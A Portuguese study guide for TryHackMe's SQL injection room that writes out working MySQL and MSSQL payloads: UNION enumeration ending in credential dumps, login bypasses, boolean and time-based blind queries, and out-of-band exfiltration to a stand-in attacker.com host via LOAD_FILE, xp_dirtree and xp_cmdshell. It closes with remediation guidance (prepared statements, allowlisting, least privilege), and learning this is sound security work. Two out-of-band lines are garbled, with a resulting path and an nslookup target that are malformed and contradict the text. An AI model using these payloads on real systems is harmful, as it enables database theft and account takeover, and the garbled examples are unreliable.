# Guia Completíssimo: SQL Injection Introduction (TryHackMe)

Referência técnica detalhada sobre os fundamentos lógicos, mecânicas de ataque, cenários de teste e métodos de remediação para SQL Injection (focado em MySQL).

---

## Tabela de Conteúdos
1. [Fundamentos e Blocos de Construção (Building Blocks)](#1-fundamentos-e-blocos-de-construção-building-blocks)
2. [Conceito, Vetores e Métodos de Deteção](#2-conceito-vetores-e-métodos-de-deteção)
3. [In-Band SQL Injection (Union & Error-Based)](#3-in-band-sql-injection-union--error-based)
4. [Blind SQL Injection: Authentication Bypass](#4-blind-sql-injection-authentication-bypass)
5. [Blind SQL Injection: Boolean-Based & Time-Based](#5-blind-sql-injection-boolean-based--time-based)
6. [Out-of-Band (OOB) SQL Injection](#6-out-of-band-oob-sql-injection)
7. [Metodologias de Defesa e Remediação](#7-metodologias-de-defesa-e-remediação)

---

## 1. Fundamentos e Blocos de Construção (Building Blocks)

Estruturas avançadas de SQL que servem como base para fazer os payloads de injeção funcionar.

* **SQL Comments (Comentários):** 
  * *O que são:* Instruções que forçam a base de dados a ignorar tudo o que vem a seguir na linha. Em MySQL utiliza-se `-- ` (dois traços seguidos de um espaço) ou `#`. Comentários de múltiplas linhas usam `/* */`.
  * *Cenário:* Serve para "cortar" de forma limpa a sintaxe original que sobrou da query do programador, evitando erros de sintaxe após o teu payload.
  * *Exemplo:* Se a query original for `SELECT * FROM users WHERE username='INPUT' AND password='secret';`, injetar `admin'-- ` transforma-a em `SELECT * FROM users WHERE username='admin'-- AND password='secret';`. O teste de password é completamente ignorado.
* **UNION (Operador de União):** 
  * *O que é:* Combina os resultados de dois ou mais comandos SELECT num único conjunto de resultados. Exige estritamente a mesma quantidade de colunas e tipos de dados compatíveis entre as consultas.
  * *Cenário:* Permite anexar uma query maliciosa a uma consulta legítima para extrair dados de tabelas totalmente diferentes (base do Union-Based SQLi).
* **LIKE e Wildcards (Padrões):** 
  * *O que são:* Operadores para correspondência de padrões em strings. O `%` coincide com qualquer sequência de caracteres e o `_` coincide com exatamente um caractere.
  * *Cenário:* Usado em Blind SQLi para adivinhar dados letra a letra (ex: testar `LIKE 'a%'`, `LIKE 'b%'` até o servidor confirmar o match).
* **LIMIT (Cláusula de Limite):** 
  * *O que é:* Controla o número de linhas devolvidas pela base de dados. A sintaxe `LIMIT offset, count` permite saltar linhas e gerir o tamanho do output.
  * *Cenário:* Usado para isolar resultados específicos ou evitar que a página fique sobrecarregada com demasiados dados de uma só vez (ex: `LIMIT 2, 1` salta duas linhas e traz apenas a terceira).
* **String Functions (Funções de Texto):** 
  * *`group_concat()`:* Agrega os valores de múltiplas linhas e transforma-os numa única string separada por vírgulas, permitindo extrair blocos de dados de uma só vez.
  * *`CONCAT()`:* Junta valores individuais de uma linha (ex: `CONCAT(username, ':', password)` produz `admin:pass123`).
* **Base de Dados `information_schema`:** 
  * *O que é:* Uma base de dados nativa (MySQL, MariaDB, PostgreSQL) que contém o mapa da estrutura do próprio servidor (metadados sobre bases de dados, tabelas e colunas).
  * *Tabelas Críticas:* `information_schema.tables` (coluna `table_name`) e `information_schema.columns` (coluna `column_name`). É a ferramenta que permite descobrir a estrutura exata do servidor alvo.

---

## 2. Conceito, Vetores e Métodos de Deteção

* **O que é:** Ocorre quando uma aplicação web incorpora dados fornecidos pelo utilizador diretamente numa query SQL sem qualquer sanitização ou parametrização. O interpretador trata o input como código SQL executável, permitindo ao atacante alterar a lógica da query e interagir com a base de dados de formas não planeadas.
* **Vetores Comuns de Entrada:** Parâmetros de URL (`?id=1`), campos de formulários (caixas de login, pesquisa, comentários), Cookies e Cabeçalhos HTTP.
* **Como Testar (Deteção Prática):**
  * Injetar uma plica (`'`) ou aspas duplas (`"`) -> Se a aplicação devolver um erro de base de dados, o input está a entrar diretamente na query sem tratamento.
  * Injetar `;--` -> Verificar se a aplicação muda de comportamento ao processar o comentário.
  * Injetar lógicas como `OR 1=1` -> Validar se o input altera os resultados lógicos da página.

---

## 3. In-Band SQL Injection (Union & Error-Based)

Categoria mais comum e fácil de explorar. O mesmo canal de comunicação utilizado para enviar a injeção é usado para receber os resultados diretamente na resposta da página web.

### Error-Based SQLi
* **O que é:** Explora servidores mal configurados que exibem mensagens brutas de erro de SQL diretamente no ecrã do utilizador.
* **Como Testar:** Injetar uma plica `'`. Se o ecrã mostrar um erro de sintaxe (ex: *...near ''1'' at line 1*), confirma-se que a base de dados é MySQL, que o input está envolto em plicas e que a aplicação falha na gestão de erros.

### Union-Based SQLi
* **O que é:** Utiliza o operador UNION para anexar uma consulta SELECT personalizada à query original e extrair dados de qualquer tabela acessível.
* **Como Testar (Metodologia Passo a Passo):**
  * *Passo 1 (Contar Colunas):* Incrementar valores no UNION SELECT até o erro de contagem desaparecer: `1 UNION SELECT 1,2,3-- `
  * *Passo 2 (Identificar Colunas Visíveis):* Mudar o ID original para um valor falso (como `0` ou `-1`) para que a query original venha vazia e apenas o output do UNION apareça na página: `0 UNION SELECT 1,2,3-- `
  * *Passo 3 (Extrair a Base de Dados):* Substituir o número da coluna que apareceu no ecrã pela função: `0 UNION SELECT 1,2,database()-- `
  * *Passo 4 (Enumerar Tabelas):* Extrair as tabelas da DB encontrada através do information_schema: `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='nome_da_db'-- `
  * *Passo 5 (Enumerar Colunas):* Descobrir as colunas da tabela que queres atacar: `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='tabela_alvo'-- `
  * *Passo 6 (Extrair os Dados):* Fazer o download dos dados confidenciais: `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM tabela_alvo-- `

---

## 4. Blind SQL Injection: Authentication Bypass

Ocorre quando a aplicação executa a query internamente mas não exibe qualquer output de dados ou erro de base de dados no ecrã. O sucesso do ataque é inferido puramente pela mudança de comportamento do site (ex: conseguir entrar numa conta).

* **O que é:** Contornar a lógica de formulários de autenticação fazendo com que a query de login retorne pelo menos uma linha válida, independentemente da password introduzida.
* **Como Testar:** 
  * *Bypass Geral:* Injetar `' OR 1=1;-- ` no campo de username e qualquer texto na password. A query transforma-se em `WHERE username='' OR 1=1;--`, validando o login e autenticando o atacante no primeiro registo da tabela (geralmente a conta de administrador).
  * *Alvo Específico:* Injetar `admin'-- ` no campo de username. A verificação de password é comentada e a base de dados devolve especificamente a linha da conta admin.
* **Variações de Payload:** Testar aspas duplas (`" OR 1=1--`) ou alternar o caractere de comentário para MySQL (`' OR 1=1#`).

---

## 5. Blind SQL Injection: Boolean-Based & Time-Based

Utilizado para extrair dados completos (letra por letra) quando o servidor não exibe outputs diretos.

### Boolean-Based Blind SQLi
* **O que é:** A aplicação devolve um sinal binário (verdadeiro ou falso) através de pequenas mudanças visíveis (conteúdos diferentes, respostas JSON como `{"taken":true}` vs `{"taken":false}`).
* **Como Testar:** 
  * Enviar uma condição logicamente verdadeira: `admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';-- `. Se o site responder que o utilizador existe (`true`), a injeção funciona.
  * Descobrir os nomes ciclando letras com wildcards: `admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';-- `. Quando a resposta mudar para verdadeiro, descobriste a primeira letra. Repete-se para as seguintes (`sa%`, `sb%`) e aplica-se a mesma lógica ao `information_schema`.

### Time-Based Blind SQLi
* **O que é:** Utilizado quando a página responde de forma idêntica (mesmo HTML, mesmo status code), não dando qualquer feedback visual. O único sinal utilizável é o tempo de resposta do servidor.
* **Como Testar:**
  * Injetar a função `SLEEP(5)` para pausar a execução se uma condição for real: `admin123' UNION SELECT SLEEP(5),2;-- `. Se o servidor demorar 5 segundos a responder, descobriste o número de colunas ou a condição é verdadeira.
  * *Nota de Alerta:* Flutuações na rede podem criar falsos positivos. Devem usar-se tempos maiores (5 a 10 segundos) e repetir os testes para garantir a precisão. (Em MSSQL usa-se `WAITFOR DELAY '0:0:5'`).
 
---

## 6. Out-of-Band (OOB) SQL Injection

Técnica avançada utilizada quando todos os outros métodos falham (outputs ocultos, respostas idênticas e rede instável/SLEEP bloqueado), mas o servidor da base de dados tem permissão para efetuar ligações de rede externas.

* **O que é:** O atacante envia o ataque pelo canal web normal, mas força a base de dados a abrir uma ligação de rede externa independente (DNS ou HTTP) para um servidor controlado pelo atacante, transportando os dados roubados embutidos no próprio pedido.
* **Mecânica em MySQL (Ambientes Windows):**
  * Utiliza a função `LOAD_FILE()` para ler caminhos de rede UNC, o que força uma resolução automática de DNS. O atacante embute os dados que quer como um subdomínio.
  * *Payload:* `SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));` -> Se a base de dados se chamar `webapp_db`, o `CONCAT()` gera o caminho `\\webapp_://attacker.com\share`. O `LOAD_FILE()` tenta ler o ficheiro, disparando uma resolução DNS. O servidor DNS do atacante apanha o pedido e regista o subdomínio `webapp_db`.
* **Mecânica em MSSQL:**
  * `xp_dirtree`: Força uma resolução DNS ao tentar listar diretórios remotos num servidor controlado pelo atacante (`EXEC master..xp_dirtree '\\attacker.com\share';`). Está ativa por padrão e é muito usada em pentests.
  * `xp_cmdshell`: Corre comandos do sistema operativo diretamente (se estiver ativa), permitindo enviar dados via rede externa com utilitários nativos (`EXEC xp_cmdshell 'nslookup ://attacker.com';`). Desativada por padrão em versões modernas.
* **Receção de Dados:** 
  * *Burp Collaborator:* Gera subdomínios únicos e monitoriza interações de DNS/HTTP.
  * *Interactsh:* Alternativa gratuita e open-source da ProjectDiscovery que pode ser self-hosted.
  * *Custom Listener:* Servidor DNS próprio feito em Python com a biblioteca `dnslib` ou servidor HTTP simples.
* **Limitações:** Exige que o servidor da base de dados tenha permissão na firewall para efetuar conexões de saída (*outbound traffic*). Payloads dependem do motor específico da BD. Os rótulos de subdomínio em DNS estão restritos ao limite de 63 caracteres por pedido. É mais lento e flutuante do que extrair dados diretamente.

---

## 7. Metodologias de Defesa e Remediação

Escrever um relatório de vulnerabilidades exige explicar ao cliente como corrigir o código de forma eficaz, seguindo a ordem de importância das defesas:

### Prepared Statements / Consultas Parametrizadas (A Solução Definitiva)
Separam fisicamente o código SQL dos dados do utilizador. O programador define a estrutura da query com marcadores de posição (placeholders) e a base de dados recebe o input separadamente, tratando-o puramente como uma string literal e nunca como código executável. Mesmo injetando `' OR 1=1--`, o input é tratado como texto e não afeta a estrutura.

* **Exemplo em PHP (Vulnerável):**
  ```php
  $query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
  $result = mysqli_query($conn, $query);
  ```
* **Exemplo em PHP PDO (Corrigido com Prepared Statements):**
  ```php
  $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
  $stmt->execute([$_POST['username']]);
  $result = $stmt->fetchAll();
  ```

* **Exemplo em Python (Vulnerável):**
  ```python
  query = f"SELECT * FROM users WHERE username='{username}'"
  cursor.execute(query)
  ```
* **Exemplo em Python (Corrigido com Conector MySQL):**
  ```python
  cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
  ```
  *(O `%s` funciona como placeholder e o conector trata do escaping e binding dos parâmetros automaticamente).*

### Validação de Input (Allowlisting)
Controla os dados que a aplicação aceita antes de chegarem à base de dados. A melhor abordagem é a **Lista de Permissões (Allowlist)**, definindo o que é válido e rejeitando tudo o resto. Se um parâmetro deve ser um ID numérico de um artigo, deve ser validado no código:
```php
if (!ctype_digit(\$_GET['id'])) {
    die("Invalid input");
}
```
*Nota:* Nunca deve ser usada sozinha, mas sim em conjunto com Prepared Statements. Tentar barrar caracteres individuais (Blocklisting - como `'` ou `--`) é ineficaz, pois atacantes contornam filtros com dupla codificação ou sintaxes alternativas.

### Escaping de Input
Consiste em adicionar uma barra invertida antes de caracteres especiais (`' -> \'`) para que a base de dados os trate como texto e não como código. É uma abordagem frágil, dependente das regras de cada base de dados e deve ser usada apenas como último recurso em sistemas legados difíceis de refatorar.

### Princípio do Menor Privilégio (Defesa em Profundidade)
Garante a limitação do impacto caso ocorra uma exploração. A conta usada pela aplicação web deve ter os privilégios estritamente necessários para o seu funcionamento (ex: se a app só lê dados, dar apenas acesso a `SELECT`). Nunca ligar à base de dados a partir da aplicação web utilizando a conta `root` ou `sa`. Bloquear tabelas sensíveis a procedimentos específicos impede que um atacante use DROP nas tabelas ou aceda a comandos de sistema.

### Web Application Firewalls (WAFs)
Inspecionam os pedidos HTTP recebidos à procura de assinaturas de ataque conhecidas (como `UNION SELECT` ou `information_schema`). Funcionam como uma camada de proteção extra, mais **não substituem código seguro**, uma vez que atacantes experientes conseguem contornar WAFs através de técnicas de ofuscação e codificação alternativa.
